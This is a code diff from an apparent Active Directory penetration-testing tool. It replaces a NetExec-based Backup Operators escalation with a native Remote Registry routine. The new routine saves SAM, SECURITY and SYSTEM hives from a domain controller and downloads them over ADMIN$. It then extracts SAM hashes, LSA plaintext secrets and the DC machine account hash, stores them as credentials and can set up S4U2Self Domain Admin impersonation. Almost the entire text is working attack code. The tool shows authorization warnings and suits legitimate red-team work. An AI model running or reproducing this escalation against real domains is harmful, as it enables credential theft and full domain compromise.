@@ -2,7 +2,6 @@
 
 from __future__ import annotations
 
-import os
 import sys
 import re
 from datetime import datetime, timezone
@@ -13,17 +12,14 @@ from rich.prompt import Confirm
 from adscan_internal import print_error, print_info_debug, print_warning
 from adscan_internal.rich_output import (
     mark_sensitive,
-    print_operation_header,
     print_panel,
     print_system_change_warning,
 )
-from adscan_internal.text_utils import strip_ansi_codes
 from adscan_internal import telemetry
 from adscan_internal.integrations.netexec.parsers import (
     parse_netexec_sysvol_listing,
 )
 from adscan_internal.integrations.netexec.shares import (
-    download_share_files,
     list_share_directory,
 )
 from adscan_internal.services.attack_graph_runtime_service import (
@@ -34,7 +30,6 @@ from adscan_internal.services.attack_graph_service import (
     resolve_domain_node_record_for_domain,
     update_edge_status_by_labels,
 )
-from adscan_internal.workspaces import domain_subpath
 
 _EMPTY_NTLM_HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"
 _MACHINE_HASH_RE = re.compile(
@@ -438,353 +433,248 @@ def offer_backup_operators_escalation(
     username: str,
     password: str,
 ) -> bool:
-    """Attempt Backup Operators escalation via NetExec module.
+    """Backup Operators escalation via native async RRP (no netexec).
 
-    Returns:
-        bool: True if we extracted a machine account NTLM hash and invoked
-        add_credential, False otherwise.
+    Uses NativeDumpService.backup_operator_dump() which opens HKLM\\SAM,
+    HKLM\\SECURITY and HKLM\\SYSTEM with REG_OPTION_BACKUP_RESTORE flags,
+    downloads the hives via ADMIN$, and parses them in-process.
+
+    Returns True if we extracted a usable DC machine account hash.
     """
+    import tempfile
+
+    from adscan_internal.services.async_bridge import run_async_sync
+    from adscan_internal.services.exploitation.native_dump_service import NativeDumpService
+    from adscan_internal.services.exploitation.dump_display import DumpDisplay, CredentialType
+    from adscan_internal.services.smb_transport import SMBConfig
+
     try:
-        pdc_ip = shell.domains_data.get(domain, {}).get("pdc")
+        pdc_ip: str = str(shell.domains_data.get(domain, {}).get("pdc") or "")
+        pdc_hostname: str | None = shell.domains_data.get(domain, {}).get("pdc_hostname")
         if not pdc_ip:
             print_error("Backup Operators escalation requires a PDC IP.")
-            update_active_step_status(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "missing_pdc"},
-            )
-            return False
-
-        if not getattr(shell, "netexec_path", None):
-            print_error("NetExec is not configured; cannot run backup_operator module.")
-            update_active_step_status(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "netexec_missing"},
-            )
+            update_active_step_status(shell, domain=domain, status="failed",
+                                      notes={"reason": "missing_pdc"})
             return False
 
         marked_domain = mark_sensitive(domain, "domain")
         marked_pdc = mark_sensitive(pdc_ip, "ip")
 
-        print_operation_header(
-            "Backup Operators Escalation",
-            details={
-                "Domain": domain,
-                "User": username,
-                "PDC": pdc_ip,
-                "Module": "backup_operator",
-            },
-            icon="🧰",
+        # ── UX header ────────────────────────────────────────────────────────
+        display = DumpDisplay()
+        display.operation_header(
+            "Backup Operators (native RRP)", pdc_hostname or pdc_ip, phases=3
         )
 
+        # ── Operator confirmation (non-auto mode) ─────────────────────────
         if not getattr(shell, "auto", False):
-            marked_domain = mark_sensitive(domain, "domain")
-            marked_pdc = mark_sensitive(pdc_ip, "ip")
             print_system_change_warning(
                 title="[bold yellow]Backup Operators Warning[/bold yellow]",
                 summary=(
-                    f"This escalation will copy sensitive registry hives to SYSVOL on {marked_pdc} in {marked_domain}."
+                    f"Saves SAM/SECURITY/SYSTEM hives from {marked_pdc} ({marked_domain}) "
+                    "via Remote Registry with SeBackupPrivilege flags."
                 ),
                 planned_changes=[
-                    "Dump SYSTEM, SAM, and SECURITY into SYSVOL.",
-                    "Download the dumped hives and parse them for the DC machine account hash.",
+                    "Temporarily writes SAM, SECURITY, SYSTEM to C:\\Windows\\Temp on the DC.",
+                    "Downloads hives via ADMIN$ and deletes them immediately after.",
+                    "Parses DC machine account hash ($MACHINE.ACC) from LSA secrets.",
                 ],
                 impact_notes=[
-                    "The operation writes sensitive files to SYSVOL and may be visible to defenders.",
+                    "Hives are written to Windows\\Temp, not SYSVOL — reduced visibility vs legacy module.",
+                    "RemoteRegistry service is started if not running.",
                 ],
                 cleanup_notes=[
-                    "If the exploit fails, the dumped hives may remain in SYSVOL until you remove them manually.",
-                    "In production, ensure SYSVOL artifacts are cleaned up immediately.",
+                    "Hives are deleted automatically via SMB after download.",
+                    "RemoteRegistry is left running — stop it manually if needed.",
                 ],
                 authorization_note=(
-                    "Only continue if you are explicitly authorized to create temporary dump artifacts on the domain controller."
+                    "Only proceed if explicitly authorized to read DC registry hives."
                 ),
             )
-            if not Confirm.ask(
-                "Proceed with Backup Operators escalation?",
-                default=False,
-            ):
+            if not Confirm.ask("Proceed with Backup Operators escalation?", default=False):
                 print_warning("Backup Operators escalation skipped by user.")
-                _update_backup_ops_da_edge(
-                    shell,
-                    domain=domain,
-                    status="discovered",
-                    notes={"action": _BACKUP_OPS_GRAPH_RELATION, "skipped": True},
-                )
+                _update_backup_ops_da_edge(shell, domain=domain, status="discovered",
+                                           notes={"action": _BACKUP_OPS_GRAPH_RELATION,
+                                                  "skipped": True})
                 return False
 
-        _mark_backup_ops_attempted(
-            shell,
+        # ── State tracking ────────────────────────────────────────────────
+        _mark_backup_ops_attempted(shell, domain=domain, username=username,
+                                   pdc=pdc_ip, hostname=pdc_hostname)
+        _update_backup_ops_da_edge(shell, domain=domain, status="attempted",
+                                   notes={"action": _BACKUP_OPS_GRAPH_RELATION})
+        update_active_step_status(shell, domain=domain, status="attempted",
+                                  notes={"action": "backup_operator"})
+
+        # ── DA selection for S4U2Self elevation ──────────────────────────
+        # S4U2Self only applies when the incoming credential is the DC's OWN
+        # machine account (e.g. DC01$ targeting DC01, not svc_backup, not
+        # WEB01$ targeting DC01, not gMSA accounts that also end in "$").
+        from adscan_internal.services.exploitation.machine_account_elevation import (
+            is_dc_machine_account,
+        )
+        elevation_target_user: str | None = None
+        if is_dc_machine_account(username, pdc_hostname) and not getattr(shell, "auto", False):
+            from adscan_internal.cli.privileged_target_selection import (
+                resolve_privileged_target_user,
+            )
+            elevation_target_user = resolve_privileged_target_user(
+                shell,
+                domain=domain,
+                purpose="S4U2Self impersonation via DC machine account",
+                require_domain_admin=True,
+                exclude_protected_users=True,
+                exclude_not_delegated=True,
+            )
+
+        # ── Build SMBConfig ───────────────────────────────────────────────
+        is_hash = len(password) == 32 and all(c in "0123456789abcdef" for c in password.lower())
+        smb_config = SMBConfig(
+            target_ip=pdc_ip,
+            target_hostname=pdc_hostname,
             domain=domain,
+            auth_domain=domain,
             username=username,
-            pdc=pdc_ip,
-            hostname=shell.domains_data.get(domain, {}).get("pdc_hostname"),
-        )
-        _update_backup_ops_da_edge(
-            shell,
-            domain=domain,
-            status="attempted",
-            notes={"action": _BACKUP_OPS_GRAPH_RELATION},
-        )
-        update_active_step_status(
-            shell,
-            domain=domain,
-            status="attempted",
-            notes={"action": "backup_operator"},
+            password=None if is_hash else password,
+            nt_hash=password if is_hash else None,
+            kdc_ip=pdc_ip,
+            use_kerberos=False,
         )
 
-        auth = shell.build_auth_nxc(username, password, domain, kerberos=False)
-        auth_log = re.sub(r"(\\s-p\\s+)'[^']*'", r"\\1'[REDACTED]'", auth)
-        auth_log = re.sub(r"(\\s-H\\s+)\\S+", r"\\1[REDACTED]", auth_log)
-        command = f"{shell.netexec_path} smb {pdc_ip} {auth} --smb-timeout 30 -t 1 -M backup_operator"
-        command_log = (
-            f"{shell.netexec_path} smb {marked_pdc} {auth_log} --smb-timeout 30 -t 1 -M backup_operator"
-        )
-        print_info_debug(f"[backup-ops] Command: {command_log}")
-
-        completed = shell._run_netexec(command, domain=domain, timeout=300)
-        if not completed:
-            print_error("Backup Operators escalation failed to execute.")
-            _update_backup_ops_da_edge(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "netexec_failed"},
-            )
-            update_active_step_status(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "netexec_failed"},
-            )
-            host = shell.domains_data.get(domain, {}).get("pdc_hostname") or pdc_ip
-            _fallback_winrm_dump(
-                shell,
-                domain=domain,
-                username=username,
-                password=password,
-                host=host,
-            )
-            return False
-
-        output = strip_ansi_codes(
-            (completed.stdout or "") + "\n" + (completed.stderr or "")
-        )
-        print_info_debug(
-            "[backup-ops] Module output collected "
-            f"(stdout_len={len(completed.stdout or '')}, stderr_len={len(completed.stderr or '')})."
-        )
-
-        dc_hostname = shell.domains_data.get(domain, {}).get(
-            "pdc_hostname"
-        ) or _extract_dc_hostname(output)
-        if not dc_hostname:
-            print_warning(
-                f"Could not determine DC hostname for {marked_domain}; "
-                "machine account hash will be skipped."
-            )
-        else:
-            print_info_debug(f"[backup-ops] Parsed DC hostname: {dc_hostname}")
-
-        nt_hash = _extract_machine_nt_hash(output, dc_hostname=dc_hostname)
-        if not nt_hash:
-            print_warning(
-                "Backup Operators module did not return a usable machine NTLM hash."
-            )
-            _update_backup_ops_da_edge(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "no_machine_hash"},
-            )
-            update_active_step_status(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "no_machine_hash"},
-            )
-            if "ERROR_ALREADY_EXISTS" in output:
-                print_info_debug(
-                    "[backup-ops] Detected SYSVOL files already present; listing SYSVOL."
+        # ── Phase 1: save & download hives ───────────────────────────────
+        display.phase_start(1, 3, f"Saving SAM / SECURITY / SYSTEM from {marked_pdc}")
+        with tempfile.TemporaryDirectory(prefix="adscan-backupops-") as tmp:
+            result = run_async_sync(
+                NativeDumpService().backup_operator_dump(
+                    smb_config, workspace_dir=tmp, notifier=display,
+                    target_user=elevation_target_user,
                 )
-                share_listing = list_share_directory(
-                    shell,
-                    domain=domain,
-                    host=pdc_ip,
-                    auth=shell.build_auth_nxc(
-                        username, password, domain, kerberos=True
-                    ),
-                    share="SYSVOL",
-                    directory=None,
-                )
-                files = [
-                    entry.path
-                    for entry in share_listing.entries
-                    if entry.path.upper() in _SYSVOL_SHARE_FILES
-                ]
-                if files:
-                    workspace_cwd = (
-                        shell._get_workspace_cwd()  # type: ignore[attr-defined]
-                        if hasattr(shell, "_get_workspace_cwd")
-                        else getattr(shell, "current_workspace_dir", os.getcwd())
-                    )
-                    output_dir = domain_subpath(
-                        workspace_cwd,
-                        getattr(shell, "domains_dir", "domains"),
-                        domain,
-                        "smb",
-                        "sysvol_hives",
-                    )
-                    downloaded = download_share_files(
-                        shell,
-                        domain=domain,
-                        host=pdc_ip,
-                        auth=shell.build_auth_nxc(
-                            username, password, domain, kerberos=True
-                        ),
-                        share="SYSVOL",
-                        files=files,
-                        output_dir=output_dir,
-                    )
-                    empty_files = [
-                        path
-                        for path in downloaded
-                        if os.path.exists(path) and os.path.getsize(path) == 0
-                    ]
-                    if empty_files:
-                        marked_domain = mark_sensitive(domain, "domain")
-                        print_warning(
-                            f"Downloaded SYSVOL hive(s) were empty in {marked_domain}. "
-                            "Skipping empty files."
-                        )
-                        print_info_debug(
-                            "[backup-ops] Empty SYSVOL hives: " + ", ".join(empty_files)
-                        )
-                    downloaded = [
-                        path
-                        for path in downloaded
-                        if os.path.exists(path) and os.path.getsize(path) > 0
-                    ]
-                    sam_path = next(
-                        (path for path in downloaded if path.upper().endswith("SAM")),
-                        None,
-                    )
-                    system_path = next(
-                        (
-                            path
-                            for path in downloaded
-                            if path.upper().endswith("SYSTEM")
-                        ),
-                        None,
-                    )
-                    if sam_path and system_path:
-                        print_info_debug(
-                            "[backup-ops] Downloaded SYSVOL hives; running secretsdump."
-                        )
-                        from adscan_internal.cli.dumps import run_secretsdump_registries
-
-                        run_secretsdump_registries(
-                            shell,
-                            domain=domain,
-                            sam_path=sam_path,
-                            system_path=system_path,
-                        )
-            host = shell.domains_data.get(domain, {}).get("pdc_hostname") or pdc_ip
-            _fallback_winrm_dump(
-                shell,
-                domain=domain,
-                username=username,
-                password=password,
-                host=host,
             )
+
+        if not result.success:
+            display.phase_error(f"Hive dump failed: {result.error or 'unknown error'}")
+            _update_backup_ops_da_edge(shell, domain=domain, status="failed",
+                                       notes={"reason": "dump_failed"})
+            update_active_step_status(shell, domain=domain, status="failed",
+                                      notes={"reason": "dump_failed"})
             return False
 
-        if _should_mark_sysvol_cleanup(output):
-            _mark_sysvol_cleanup_pending(
-                shell,
-                domain=domain,
-                pdc=pdc_ip,
-                hostname=dc_hostname,
-            )
+        display.phase_success(
+            f"Hives downloaded — SAM: {len(result.sam_hashes)} accounts  "
+            f"| LSA: {len(result.lsa_secrets)} secrets"
+        )
 
-        if not dc_hostname:
-            _update_backup_ops_da_edge(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "dc_hostname_missing"},
+        # ── Phase 2: stream parsed credentials ───────────────────────────
+        display.phase_start(2, 3, "Parsing credentials")
+        display.start_credential_stream(f"Backup Operators — {marked_domain}")
+
+        for sam in result.sam_hashes:
+            if sam.nt_hash and sam.nt_hash != _EMPTY_NTLM_HASH:
+                display.stream_credential(CredentialType.SAM, sam.username, sam.nt_hash)
+
+        machine_nt_hash = result.machine_account_nt_hash
+        if machine_nt_hash:
+            dc_acct = f"{(pdc_hostname or 'DC').upper()}$"
+            display.stream_credential(CredentialType.LSA, dc_acct,
+                                      machine_nt_hash, extras="[DC machine account]")
+
+        for secret in result.lsa_secrets:
+            if secret.plaintext and secret.name != "$MACHINE.ACC":
+                display.stream_credential(CredentialType.LSA, secret.name,
+                                          secret.plaintext[:32])
+
+        display.stop_credential_stream()
+        display.phase_success("Credential extraction complete")
+
+        # ── Phase 3: persist & escalate ──────────────────────────────────
+        display.phase_start(3, 3, "Persisting machine account hash")
+
+        if not machine_nt_hash:
+            display.phase_warning(
+                "No DC machine account hash in LSA secrets — "
+                "escalation incomplete (SAM hashes saved if any)"
             )
-            update_active_step_status(
-                shell,
-                domain=domain,
-                status="failed",
-                notes={"reason": "dc_hostname_missing"},
-            )
+            # Still persist any SAM hashes found
+            for sam in result.sam_hashes:
+                if sam.nt_hash and sam.nt_hash != _EMPTY_NTLM_HASH:
+                    shell.add_credential(domain, sam.username, sam.nt_hash,
+                                         prompt_for_user_privs_after=False,
+                                         credential_origin="backup_operators")
+            _update_backup_ops_da_edge(shell, domain=domain, status="failed",
+                                       notes={"reason": "no_machine_hash"})
+            update_active_step_status(shell, domain=domain, status="failed",
+                                      notes={"reason": "no_machine_hash"})
             return False
 
-        _mark_backup_ops_success(
-            shell,
-            domain=domain,
-            username=username,
-            pdc=pdc_ip,
-            hostname=dc_hostname,
-        )
-        _update_backup_ops_da_edge(
-            shell,
-            domain=domain,
-            status="success",
-            notes={"action": _BACKUP_OPS_GRAPH_RELATION},
-        )
-        update_active_step_status(
-            shell,
-            domain=domain,
-            status="success",
-            notes={"action": "backup_operator"},
+        dc_hostname_final = pdc_hostname or (pdc_hostname or "DC")
+        machine_account = f"{dc_hostname_final.upper()}$"
+
+        _mark_backup_ops_success(shell, domain=domain, username=username,
+                                 pdc=pdc_ip, hostname=dc_hostname_final)
+        _update_backup_ops_da_edge(shell, domain=domain, status="success",
+                                   notes={"action": _BACKUP_OPS_GRAPH_RELATION})
+        update_active_step_status(shell, domain=domain, status="success",
+                                  notes={"action": "backup_operator"})
+
+        # Summary panel
+        display.summary(
+            {CredentialType.SAM: len(result.sam_hashes),
+             CredentialType.LSA: len(result.lsa_secrets)},
+            total=len(result.sam_hashes) + (1 if machine_nt_hash else 0),
+            host=pdc_hostname or pdc_ip,
+            elapsed=0.0,
         )
 
-        machine_account = f"{dc_hostname.upper()}$"
-        marked_machine = mark_sensitive(machine_account, "user")
-        marked_hash = mark_sensitive(nt_hash, "password")
-        print_panel(
-            "\n".join(
-                [
-                    "✅ Backup Operators module completed",
-                    f"Domain: {marked_domain}",
-                    f"DC Account: {marked_machine}",
-                    f"NTLM Hash: {marked_hash}",
-                    "Action: Saving credential and validating access",
-                ]
-            ),
-            title="[bold green]Backup Operators Result[/bold green]",
-            border_style="green",
-            expand=False,
-        )
+        # Persist all recovered credentials.
+        # SAM hashes (DC local Administrator, etc.) are saved first without
+        # prompting so they land in the store before the machine account
+        # escalation prompt fires.
+        for sam in result.sam_hashes:
+            if sam.nt_hash and sam.nt_hash != _EMPTY_NTLM_HASH:
+                shell.add_credential(domain, sam.username, sam.nt_hash,
+                                     prompt_for_user_privs_after=False,
+                                     credential_origin="backup_operators")
 
-        shell.add_credential(
-            domain,
-            machine_account,
-            nt_hash,
+        # LSA service-account plaintext passwords (e.g. DPAPI_SYSTEM excluded
+        # since they're not usable credentials on their own).
+        # prompt_for_user_privs_after=True: fail-safe for hidden DAs in service
+        # accounts with custom names (svc_eng_admin, dom_admin_03, etc.) that
+        # the terminal attack-path check would not flag as direct_compromise.
+        # The cost is one extra adminCount LDAP query per non-DA secret; the
+        # session dedup guard + the "DA already captured" short-circuit in
+        # _offer_machine_account_dump_fallback prevent any cascade redundancy.
+        _SKIP_LSA = {"$MACHINE.ACC", "DPAPI_SYSTEM(machine)", "DPAPI_SYSTEM(user)"}
+        for secret in result.lsa_secrets:
+            if secret.plaintext and secret.name not in _SKIP_LSA:
+                shell.add_credential(domain, secret.name, secret.plaintext,
+                                     prompt_for_user_privs_after=True,
+                                     credential_origin="backup_operators")
+
+        # Machine account hash + AES keys (centralised via persist_machine_account_credential).
+        from adscan_internal.cli.machine_account_persist import persist_machine_account_credential
+
+        persist_machine_account_credential(
+            shell,
+            domain=domain,
+            machine_account=machine_account,
+            nt_hash=machine_nt_hash,
+            kerberos_password=result.machine_account_kerberos_password,
+            dc_hostname=dc_hostname_final,
+            trusted_manual_validation=True,
+            ensure_fresh_kerberos_ticket=False,
             prompt_for_user_privs_after=True,
+            credential_origin="backup_operators",
         )
+
         return True
+
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
         print_error("Backup Operators escalation encountered an error.")
-        _update_backup_ops_da_edge(
-            shell,
-            domain=domain,
-            status="failed",
-            notes={"reason": "exception"},
-        )
-        update_active_step_status(
-            shell,
-            domain=domain,
-            status="failed",
-            notes={"reason": "exception"},
-        )
+        _update_backup_ops_da_edge(shell, domain=domain, status="failed",
+                                   notes={"reason": "exception"})
+        update_active_step_status(shell, domain=domain, status="failed",
+                                  notes={"reason": "exception"})
         return False
 
 
